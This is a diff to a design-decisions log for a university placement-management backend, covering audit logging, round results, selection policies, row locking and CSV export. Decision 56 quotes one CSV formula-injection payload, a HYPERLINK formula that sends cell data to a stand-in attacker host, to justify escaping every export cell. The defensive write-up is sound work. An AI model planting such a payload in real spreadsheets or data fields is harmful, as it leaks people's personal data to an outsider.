@@ -774,18 +774,347 @@ public interface PolicyRule {
 
 **Why:** If an admin sends `maxOffers` for ONE_OFFER and it's silently dropped, they'll believe a limit exists when it doesn't. A 400 shows the mistake immediately. A switch in the service is simpler to read and test than a custom validator. The DB `CHECK`s (decision 6) remain the backstop.
 
-**TODO Milestone 7:** write an audit-log entry for each policy change.
+**Done in Milestone 7 Session B:** every real policy change is audited (`POLICY / POLICY_CHANGED`, old → new settings); a PUT that changes nothing writes no row. See decisions 53 and 54.
 
 ---
 
-## 45. Known limitation + TODO Milestone 7: policies are checked only at apply time
+## 45. Known limitation (resolved in Milestone 7): policies were checked only at apply time
 **Milestone:** 6 · **Date:** 2026-11-02
 
 **Limitation:** policies are enforced when a student **applies**, but offers are created **later**, when an admin marks an application `SELECTED` (Milestone 7). A student with 0 offers can apply to several FULL_TIME drives, every apply allowed, and then get selected by two of them. They end up holding more offers than ONE_OFFER, DREAM_OFFER or MAX_OFFERS allows. The apply-time check can't prevent this, because at apply time no offer exists yet.
 
 **Why we accept it for now:** there's no API to mark `SELECTED` until Milestone 7, so the gap can't happen through the app yet. The fix belongs where offers are created.
 
-**TODO Milestone 7 (required):**
-1. **Re-check policies when marking `SELECTED`.** Before an application becomes `SELECTED`, run `PolicyEngine` with the student's current offers *plus* the new one. Decide whether a policy violation blocks the selection (409/422 with the reason) or needs an explicit admin override.
-2. **Decide what happens to the student's other pending FULL_TIME applications** (`APPLIED`/`SHORTLISTED`) once they get an offer. Options: leave them, mark the ones the policy now forbids as `INELIGIBLE` with a `status_reason` (as for criteria changes, decision 11), or flag them for the TPO. The choice needs your sign-off.
-3. **Audit-log both changes**, and make the check race-safe if two selections for the same student can be made at once.
+**Resolved in Milestone 7 (Session A):**
+1. Selection re-checks the policies with the student's current offers; a block is a 409 with the reason, and there is no admin override (decision 49).
+2. After each new FULL_TIME offer, the student's other pending FULL_TIME applications that a policy now forbids become `INELIGIBLE` with the policy reason (decision 49).
+3. Both changes are audited (decision 46), and the student row is locked so two selections for one student can't both pass (decision 50).
+
+---
+
+## 46. Audit log: written in the same transaction, through one `StatusChanges` helper
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:**
+- `AuditService.record(...)` saves an `audit_logs` row with `@Transactional(propagation = MANDATORY)`, so it **joins the caller's transaction**. Called outside a transaction, it fails.
+- Every application status change goes through `StatusChanges.change(application, status, reason, trigger)`. It sets the status and reason and writes the audit row. If neither the status nor the reason changed, it writes nothing. `StatusChanges.created(...)` records a new application (old value `null`).
+- `actor_id` = the JWT user: the student for apply and withdraw, the admin for everything else. That includes the policy `INELIGIBLE` changes an admin's selection causes.
+- `old_value` = `{status, reason}`. `new_value` = `{status, reason, trigger}`, where trigger is `APPLY | WITHDRAW | ROUND_RESULT | SELECTION | POLICY | DRIVE_COMPLETED`.
+- The JSONB columns are mapped as `String` with `@JdbcTypeCode(SqlTypes.JSON)`, and the JSON is written with Spring's Jackson `JsonMapper`. Reasons with quotes stay valid JSON.
+- `status_reason` is `VARCHAR(300)`, so `StatusChanges` cuts longer reasons (several policy reasons joined) to 300 characters ending in "...". A long reason can't fail the whole transaction.
+
+**Alternatives:**
+- `REQUIRES_NEW` (a separate transaction for the audit row).
+- JPA entity listeners or DB triggers.
+- Calling `AuditService` by hand in every service.
+
+**Why:**
+- **Same transaction:** a change and its audit row commit together or roll back together. With `REQUIRES_NEW`, a rolled-back selection would still leave an audit row saying it happened.
+- **One helper:** every path (apply, withdraw, results, selection, policy, completion) uses the same method, so none can forget the audit, and "no change → no row" holds everywhere.
+- **Trigger field:** when a student disputes "why am I INELIGIBLE?", the row answers it directly (`POLICY`, actor = the admin who made the selection).
+- **Not listeners or triggers:** they don't know the *reason* or the *trigger*, and a DB trigger can't see the JWT user.
+
+---
+
+## 47. Rounds: numbered 1, 2, 3… without gaps; the number never changes
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:**
+- Admin endpoints: `POST/GET /api/drives/{driveId}/rounds` and `PUT /api/drives/{driveId}/rounds/{roundId}`. Rounds can be added or edited only while the drive is `OPEN` or `CLOSED` (otherwise 409).
+- A new round's `roundNo` must be the drive's next number (max + 1). Otherwise 409 "the next round number for this drive is 3". The `UNIQUE (drive_id, round_no)` constraint catches two admins adding the same number at once (409).
+- Edit changes `name` and `scheduledAt` only. `roundNo` may be left out or repeated. A different number is a 400 ("roundNo cannot be changed").
+- There's no delete in v1.
+
+**Alternatives:**
+- Allow any number and treat "the previous round" as the nearest lower one.
+- Allow renumbering while no results exist.
+
+**Why:** "Round N only for applications that CLEARED round N-1" and "must clear the final round" are only clear-cut if numbers have no gaps and never move. Renumbering a round that has results would silently change which results count as "the previous round".
+
+---
+
+## 48. Bulk round results: all or nothing, upsert, status derived from all results
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:**
+- `PUT /api/drives/{driveId}/rounds/{roundId}/results` with `{results: [{applicationId, result, remarks}]}` (1–500 items). PUT because it's an upsert: sending the same sheet twice gives the same state.
+- Only while the drive is `CLOSED` (409).
+- **Every item is checked before anything is saved.** The problems are collected by `BatchValidation`, in item order:
+  - **400-type:** an application listed twice; an application not in this drive.
+  - **409-type:** the status is `SELECTED`, `WITHDRAWN` or `INELIGIBLE`; round N > 1 without `CLEARED` in round N-1; marking `NOT_CLEARED`/`ABSENT` while the application has a result in a **later** round.
+  - Any problem → one response, `details` lists **every** problem, nothing is saved. Status 400 if any 400-type problem exists, otherwise 409.
+- Then each result is upserted (the existing row is updated, or a new one inserted), and the status is **recalculated from all the application's results** by `RoundStatusCalculator`: any `NOT_CLEARED`/`ABSENT` → `REJECTED` "Not cleared in Round N: name" (the earliest such round); otherwise any `CLEARED` → `SHORTLISTED`; otherwise `APPLIED`. The change is audited (trigger `ROUND_RESULT`).
+- Corrections are allowed until the drive is `COMPLETED`.
+
+**Alternatives:**
+- Save the valid items and report the bad ones (partial success, e.g. 207 Multi-Status).
+- Store the status as "whatever the last result said".
+- Cascade-delete later-round results when an earlier round is failed.
+
+**Why:**
+- **All or nothing:** the admin is uploading one results sheet. With partial saves they'd have to work out which rows went in and resend only the rest, which is easy to get wrong. With all-or-nothing the DB is never half-updated: fix the sheet, resend the whole thing. The upsert makes resending safe. It's also one transaction, which is simple to reason about and test.
+- **Derive the status from all results:** a correction to any round gives the right status, with no "undo" logic. The calculator is pure, so it's tested without mocks.
+- **Block instead of cascade:** "failed round 1 but cleared round 2" would be contradictory data, and silently deleting results is worse. The cost is a **known limitation:** without a delete-result endpoint, that particular correction can't be made in v1.
+
+---
+
+## 49. Final selection, and re-checking policies after each offer (fixes decision 45)
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:** `POST /api/drives/{driveId}/selections` with `{applicationIds: [...]}` (1–200), all or nothing (as decision 48). Rules for each application:
+1. The drive is `CLOSED`, and the application belongs to it and is listed once (400 otherwise).
+2. Status `APPLIED` or `SHORTLISTED`. `INELIGIBLE` → 409 **with its reason**. `SELECTED` → "already SELECTED". Others → 409 naming the status.
+3. **If the drive has rounds**, the application must have `CLEARED` the highest-numbered round: "Application 12 has not cleared the final round (Round 2: Technical)". Drives without rounds select directly.
+4. **Policies are checked again at selection time** with the student's current offers, so a policy switched on after the student applied is respected. Blocked → 409 with the policy reason.
+
+Then the application becomes `SELECTED` (audited, `SELECTION`). If the drive is `FULL_TIME` and a policy is active, the student's **other pending FULL_TIME applications** (`APPLIED`/`SHORTLISTED`, in any drive) are re-checked with `PolicyEngine`, using the offers **including the new one**. Each one now blocked → `INELIGIBLE` with the policy reason (audited, trigger `POLICY`). The response lists `selected` and `madeIneligible`.
+- **ONE_OFFER:** all other pending applications → INELIGIBLE.
+- **DREAM_OFFER (T):** first offer below T → pending applications to drives ≥ T **stay active**, the rest → INELIGIBLE. A dream offer, or the one upgrade used → all INELIGIBLE.
+- **MAX_OFFERS (n):** INELIGIBLE only once the student holds n offers.
+- An internship selection isn't an offer (decision 40), so it triggers no policy queries and no re-check.
+
+**Alternatives:**
+- Leave pending applications alone and only block the next selection.
+- Flag them for the TPO to decide.
+- An admin override for policy blocks.
+
+**Why:**
+- "May this pending application continue?" is the same question as "could the student apply to that drive now?", so the **same `PolicyEngine`** answers it, unchanged. No second set of rules to keep in sync.
+- Marking them `INELIGIBLE` right away, with the reason (as for criteria changes, decision 11), means the student and the TPO both see the effect immediately. The 409 on selecting one explains why.
+- The re-check uses the offers in memory (`old offers + the new one`), so it doesn't depend on when Hibernate flushes.
+- **Known limitation:** there's no "un-select" in v1, so an application made INELIGIBLE by a policy is never restored automatically. No override either: a TPO who wants an exception must change the policy first.
+
+---
+
+## 50. Locking: the student row guards that student's applications; the drive row guards the drive
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:**
+- **Rule:** every transaction that changes a student's application status first takes `SELECT … FOR UPDATE` on that student's `student_profiles` row. That covers apply, withdraw, round results, selection, and completing a drive.
+- **Lock first, then load.** Batches first read only the student ids (a plain id query), lock those rows (`ORDER BY id`), and only then load the `Application` entities. Otherwise Hibernate would keep the stale copies it loaded before the lock.
+- Round results, selection and every drive status change also lock the **drive row** first. The order is always **drive, then students**.
+
+**Alternatives:**
+- No lock (the race in decision 45 stays open).
+- Optimistic locking (`@Version`, needs a migration and retries).
+- `SERIALIZABLE` isolation.
+- A UNIQUE constraint.
+
+**Why:**
+- **The race:** admin A selects Riya in drive X while admin B selects her in drive Y. Both read "0 offers", both pass ONE_OFFER, and she ends up with two offers. A UNIQUE constraint can't stop this, because the rule spans rows in different drives. With the lock, B waits for A's commit, then reads Riya's new offer (and that the drive-Y application is now INELIGIBLE), and gets a 409.
+- **Apply and withdraw lock too:** otherwise a student could apply during a selection and slip past the new offer, or a withdrawal could overwrite a fresh INELIGIBLE.
+- **Updated in Session B: apply first takes a SHARED lock on the drive** (`SELECT … FOR SHARE`, `DriveRepository.findByIdForShare`), then the student lock. Without it, an apply that is in flight while an admin edits the criteria could commit afterwards against the *old* criteria and stay APPLIED, because the edit's re-check can't see an uncommitted row. Shared locks don't block each other, so students still apply in parallel; they only wait for (and block) the drive's `FOR UPDATE` lock taken by edits and status changes.
+- **The drive lock** stops "complete" from racing a results upload or a selection on the same drive. Since Session B, editing a drive takes it too (then the students, decision 57).
+- **No deadlocks:** every transaction takes the locks in the same order (the drive first, then students by ascending id). Apply takes the drive (shared) and then the student; withdraw takes only the student. Withdraw never waits for a drive lock, so it can't close a cycle with apply.
+- The locks are held for a few milliseconds by admin actions. The only contention is between requests for the **same** student or drive, which is exactly what must be serialised.
+
+---
+
+## 51. Completing a drive rejects every application still pending
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision:** `POST /api/drives/{id}/complete` (CLOSED → COMPLETED) also sets every remaining `APPLIED`/`SHORTLISTED` application to `REJECTED` "Drive completed without selection", audited with trigger `DRIVE_COMPLETED`, in the same transaction (`SelectionService.rejectPending`, called by `DriveService`). After that, results and selections are refused, because the drive isn't CLOSED.
+
+**Alternatives:**
+- Leave them pending forever.
+- A separate "reject remaining" endpoint.
+
+**Why:** a completed drive with "pending" applications would mislead students. Doing it as part of the transition means it can't be forgotten, and the reason tells the student what happened.
+
+---
+
+## 52. A V3 migration for result-only and policy audit rows (done in Session B)
+**Milestone:** 7 · **Date:** 2026-11-02
+
+**Decision (Session A):** no migration. The V1 CHECKs allow only `APPLICATION`/`DRIVE` entity types and `STATUS_CHANGED`/`CRITERIA_CHANGED` actions, so Session A audits **status changes** only.
+
+**Known limitation until then:** a result correction that leaves the status and reason unchanged (e.g. `NOT_CLEARED` → `ABSENT`, or a remarks edit) is not audited. Neither are policy changes (decision 44).
+
+**Planned for Session B:** a `V3` migration extending the CHECKs with `ROUND_RESULT`/`RESULT_CHANGED` (result-only edits) and `POLICY`/`POLICY_CHANGED` (decision 44's TODO). Both new kinds of audit row get written then.
+
+**Done in Session B:** `V3__audit_types_and_longer_reason.sql` (decision 53). Result writes and policy changes are audited (decision 54). The limitation above is closed.
+
+
+---
+
+## 53. V3 migration: new audit row kinds, and `status_reason` widened to 1000 characters
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `V3__audit_types_and_longer_reason.sql`. V1 and V2 are never edited, because Flyway checksums applied migrations.
+- The two audit CHECKs are dropped and re-added with `ROUND_RESULT`/`POLICY` (entity types) and `RESULT_CHANGED`/`POLICY_CHANGED` (actions).
+- `applications.status_reason` becomes `VARCHAR(1000)`. In PostgreSQL, widening a VARCHAR is a metadata-only change, with no table rewrite.
+- `StatusChanges` still cuts a reason longer than 1000 characters (ending in "...") **for the column only**. The audit row always stores the **full** reason. "Did anything change?" compares the cut value with the stored one, so sending the same long reason again writes no row.
+
+**Alternatives:**
+- `TEXT` with no cap.
+- Keep 300 characters and the truncation.
+- Store the reasons as a JSON array.
+
+**Why:** 1000 fits every realistic reason (six eligibility reasons or three policy reasons, each about 100–200 characters) with room to spare. A cap is still a sensible safety net: one unexpected long string shouldn't fail a whole batch. The audit log is the record for disputes, so it must never lose text.
+
+---
+
+## 54. Result-only edits and policy changes are audited; a no-op writes nothing
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:**
+- **Round results:** every new result **and** every change writes `ROUND_RESULT / RESULT_CHANGED` (entity id = the result row). The JSON is `{applicationId, roundNo, result, remarks}`, with an old value of `null` for a new result. This is on top of the `STATUS_CHANGED` row, which is written only when the status changes. Resending an identical result writes nothing.
+- **Policies:** `POLICY / POLICY_CHANGED` with `{type, active, ctcThresholdLpa, maxOffers}` old → new. A PUT that changes nothing (e.g. threshold `10` when `10.00` is stored) writes no row, but `updated_by/updated_at` are still set (decision 44).
+
+**Alternatives:**
+- Audit only corrections (not new results).
+- Audit every PUT, even with no change.
+
+**Why:** Session A had a real gap. Recording "CLEARED in round 2" for an already-SHORTLISTED application left **no trace at all**, because the status didn't change. Auditing every result write closes it. "No change → no row" is the same rule as decision 46, so the log shows only real events.
+
+---
+
+## 55. Applicants list: one page query with the student JOINed, then one batched results query
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `GET /api/drives/{id}/applications?status=&branch=&minCgpa=` (TPO_ADMIN), paginated, default sort `student.rollNo`.
+- **Filters:** null means "no filter". `minCgpa` is inclusive and must be 0–10 (otherwise 400). An unknown enum value is a 400.
+- **Each row:** the application, the student's details (including the email from `users`), and `progress {totalRounds, latestRound}`. `latestRound` is the highest-numbered round the application has a result in (`null` if none).
+- **Queries, fixed whatever the page size:**
+  1. drive exists
+  2. the applications, with `student` and `student.user` JOINed (`@EntityGraph`; both are many-to-one, so paging stays in SQL)
+  3. the count
+  4. the drive's round count
+  5. the page's results in one `IN` query
+
+  A repository test counts the SQL statements with Hibernate statistics: 5 for a page whether it has 1 row or many, 4 for the unpaged export.
+
+**Alternatives:**
+- A DTO constructor query that also aggregates the rounds in SQL.
+- A per-row lookup of rounds.
+
+**Why:** the batched `IN` query is the same pattern as the student browse page (decision 31): simple, and provably not N+1. "Latest round" answers the TPO's real question ("how far did this candidate get?") without listing every round per row.
+
+---
+
+## 56. CSV export: every cell escaped against formula injection, phone column included
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `GET /api/drives/{id}/applications/export` takes the same filters as the list, returns every row sorted by roll number, and sends `text/csv; charset=UTF-8` with `Content-Disposition: attachment; filename="drive-{id}-applicants.csv"`.
+- **`CsvWriter`** (pure, in `common`):
+  - A cell starting with `=`, `+`, `-`, `@`, tab or CR gets a leading `'`.
+  - Then RFC 4180 quoting: a cell with a comma, quote or line break is wrapped in quotes, with inner quotes doubled.
+  - CRLF line endings, and a UTF-8 BOM so Excel reads non-ASCII names correctly.
+- **The phone column is escaped too:** `+919876543210` becomes `'+919876543210`.
+- The endpoint has no `produces`, so a 400 or 404 still returns the standard JSON error.
+
+**The attack:** a student sets their name to `=HYPERLINK("http://evil.site/?d="&C2,"Click")`. When the TPO opens the export in Excel, the cell runs as a formula and can send other students' data to the attacker, or start programs through old DDE formulas. The leading `'` makes Excel treat the cell as plain text.
+
+**Why not exempt the phone column:**
+1. The "digits only, optional +" rule is **Bean Validation on the API**, not a DB constraint, so rows from the seed, SQL fixes or a future import path can bypass it.
+2. An exemption is one more rule every future column has to remember. "Every cell is escaped" can't be forgotten.
+3. Without the `'`, Excel turns `+919876543210` into the number `9.19877E+11` and the digits are lost. Shown as text, the phone number stays readable.
+
+**Known limitation:** the export loads all matching rows in one go, which is fine for a drive (hundreds of applicants) but not streamed.
+
+---
+
+## 57. Criteria-change re-evaluation: lock, re-check with `EligibilityService`, one-way
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** in `DriveService.update`:
+1. Lock the drive row (`FOR UPDATE`), check that the drive is editable and the jobType rule (decision 58), then snapshot the old values.
+2. Apply the edit and validate it (dates, `checkCanOpen` for OPEN).
+3. If nothing changed: no audit, no re-check, `applicationsMadeIneligible: 0`.
+4. If the drive is **OPEN** and an **eligibility field** changed (branches, minCgpa, maxBacklogs, graduationYear), `CriteriaChangeService.reevaluate` runs:
+   - read the student ids of `APPLIED`/`SHORTLISTED` applications, lock those students (`ORDER BY id`), and load the applications fresh with the student JOINed;
+   - run the **unchanged** `EligibilityService` on each one;
+   - each one that fails becomes `INELIGIBLE` "Drive criteria changed: \<every reason, joined with ; \>" through `StatusChanges` (trigger `CRITERIA_CHANGE`, actor = the admin).
+5. The edit is audited as `DRIVE / CRITERIA_CHANGED` with **only the changed fields** old → new. The new value also has `applicationsMadeIneligible`. Values are normalised so `12` = `12.00`, and branches are a sorted list.
+6. The PUT response is `DriveResponse` plus `applicationsMadeIneligible`. The field is `@JsonInclude(NON_NULL)`, so other drive responses are unchanged.
+
+- Status and deadline need no special handling: the drive is OPEN with a future deadline (just checked), so those two eligibility rules always pass and only the criteria decide.
+- Edits to non-criteria fields (title, CTC, location, deadline…) are audited but re-check nothing. A later deadline doesn't make an existing application less eligible.
+
+**Known limitations:**
+- **One-way only.** Loosening the criteria never restores an `INELIGIBLE` application. Restoring would need to know *why* each one became INELIGIBLE (criteria, policy, or an earlier edit) and would undo decisions students may have acted on. A TPO who wants to restore one must do it outside the app in v1.
+- **Placement policies are not re-checked** on an edit (for example, a CTC change across the DREAM_OFFER threshold). This is safe because selection re-checks policies anyway (decision 49), so a forbidden offer still can't happen. The student only learns of the block at selection time instead of at edit time.
+
+**Alternatives:**
+- Two-way re-evaluation.
+- Flag the applications for the TPO instead of changing them.
+- A separate "re-evaluate" endpoint.
+
+**Why:** the same `EligibilityService` that decides apply decides re-evaluation, so there's no second set of rules to keep in sync. Doing it inside the edit's transaction means the edit, the status changes and their audit rows commit together. The reason tells the student exactly which new rule they fail, which is the whole point of the project.
+
+---
+
+## 58. `jobType` can change only while a drive is DRAFT
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** changing `jobType` on an OPEN drive is a **409** "jobType can be changed only while the drive is DRAFT (status: OPEN): switching between FULL_TIME and INTERNSHIP would change what counts as an offer for students who already applied". Leaving it unchanged is fine. CLOSED and COMPLETED drives can't be edited at all (decision 18).
+
+**Alternatives:**
+- Allow it and re-check policies.
+- Allow it silently.
+
+**Why:** FULL_TIME vs INTERNSHIP decides what counts as an offer and whether policies apply (decision 40). Switching it mid-process would silently change the rules for students who applied under the old ones. A one-line rule is simpler and more honest than trying to re-derive everything.
+
+---
+
+## 59. Audit view: fixed newest-first order, filters checked, JSON returned as JSON
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `GET /api/audit?entityType=&entityId=&from=&to=` (TPO_ADMIN), paginated.
+- **Order:** always `createdAt DESC, id DESC`. Any client sort is ignored; `id` breaks ties within one transaction.
+- **Date range:** `from` is inclusive and `to` exclusive, both ISO-8601 instants.
+- **400s:** `entityId` without `entityType` (ids are only unique within a type); `from` not before `to`; a malformed date.
+- **Response:** `oldValue`/`newValue` are real JSON objects (parsed from JSONB), not strings. `actorEmail` comes from one batched `IN` query per page, and is `null` for system rows.
+- **Null filters:** the query uses `CAST(:from AS Instant) IS NULL`. For a null `Instant`, the driver sends no type, and PostgreSQL fails with "could not determine data type of parameter". The rollback DB test caught this; mocks wouldn't have.
+
+**Alternatives:**
+- JPA Specifications (dynamic WHERE).
+- Default `from`/`to` sentinel dates.
+
+**Why:** an audit log read in any order other than "newest first" is confusing, so the order isn't configurable. One JPQL query with nullable filters is easy to read, and the cast is a single documented line.
+
+---
+
+## 60. Stats: aggregate SQL, offers = FULL_TIME selections, CTC over each student's best offer
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `GET /api/stats` (TPO_ADMIN).
+
+**Definitions:**
+- **Offer:** `SELECTED` in a `FULL_TIME` drive (decision 40). It's written once as a SQL fragment that every query reuses.
+- **Placed:** a student with at least one offer.
+- **CTC (highest, average, median):** over each placed student's **best** offer, so a student with two offers counts once.
+- **Total students:** every student profile (all batches).
+
+**Queries:** 4 native aggregate queries through Spring's `JdbcClient` (spring-jdbc, already a dependency of Spring Data JPA):
+- students and placed students per branch (`COUNT … FILTER (WHERE EXISTS …)`)
+- offers per company
+- `MAX`/`AVG`/`percentile_cont(0.5)` over the best offers
+- drives per status
+
+**Java's part:** it only sums the few branch rows, divides counts into percentages (2 decimals, HALF_UP, 0.00 when there are no students), and fills in drive statuses that have 0 drives. The service is `@Transactional(readOnly = true)`, so the 4 queries share one connection and transaction.
+
+**Alternatives:**
+- Count over every offer.
+- JPQL (has no median).
+- Load the entities and compute in Java.
+
+**Why:** "average package" in Indian placement reports means per placed student. Counting a double-offer student twice would inflate it. The database is built to aggregate: the response size is the same whether there are 50 students or 50,000, and nothing is loaded into memory row by row.
+
+**Known limitation:** all batches are mixed together. A `graduationYear` filter would be a small v2 addition.
+
+---
+
+## 61. Repository tests run on the dev Postgres inside a rolled-back transaction (for now)
+**Milestone:** 7 (Session B) · **Date:** 2026-11-02
+
+**Decision:** `@PostgresTest` = `@DataJpaTest` + the real local Postgres (`replace = NONE`) + Hibernate statistics. It's used where mocks can't help: native SQL (median), JSONB, null-parameter binding, and SQL statement counts. Each test's transaction is rolled back. The stats test deletes rows **inside** its transaction to start from a known state, and the rollback restores them (checked: the dev counts were unchanged after the run).
+
+**Alternatives:**
+- Testcontainers (not in the stack).
+- H2 (no `percentile_cont`, different JSON and null typing).
+- Only unit tests plus a manual Postman check.
+
+**Why:** these tests found two real bugs before Postman did: the null-`Instant` typing error, and a `NullPointerException` in `Map.of().get(null)` for system audit rows.
+
+**TODO Milestone 11:** move all DB tests to a separate test database (a second Compose service or the CI Postgres service), so they never depend on, or briefly lock rows in, the dev database.
